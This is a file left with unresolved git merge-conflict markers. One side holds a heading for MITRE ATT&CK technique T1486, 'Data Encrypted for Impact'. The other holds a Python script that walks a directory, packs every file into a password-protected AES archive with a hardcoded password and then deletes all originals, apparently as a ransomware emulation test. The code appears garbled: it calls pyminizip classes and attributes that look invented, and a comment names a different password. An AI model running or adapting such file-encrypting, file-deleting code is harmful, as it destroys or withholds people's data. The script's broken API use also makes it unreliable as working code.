<<<<<<< HEAD
# Data Encrypted for Impact (T1486)
=======
import os
import pyminizip
import shutil

def encrypt_files(directory):
    # Create a new 7z archive with AES encryption
    with pyminizip.MiniZipFile("encrypted_data.7z", "w") as archive:
        for root, dirs, files in os.walk(directory):
            for file in files:
                filepath = os.path.join(root, file)
                arcname = os.path.relpath(filepath, directory).replace("\\", "/")
                # AES encryption with password "my_password"
                arcinfo = pyminizip.MiniZipArchiveInfo()
                arcinfo.enc_method = pyminizip.METHOD_AES
                arcinfo.enc_key_len = 128
                arcinfo.enc_password = "H@rdP@$$19012345".encode("utf-8")
                arcname = arcname + "/"
                archive.write(filepath, arcname, arcinfo)

    # Delete the original files
    for root, dirs, files in os.walk(directory):
        for file in files:
            os.remove(os.path.join(root, file))

if __name__ == "__main__":
    directory = "C:\Users\cmndcntrl\Desktop\encrypt-test\/"  # Replace with the actual directory path
    encrypt_files(directory)
>>>>>>> 3fa6254e59cdd81fce0134a0bb1713db9f282b81
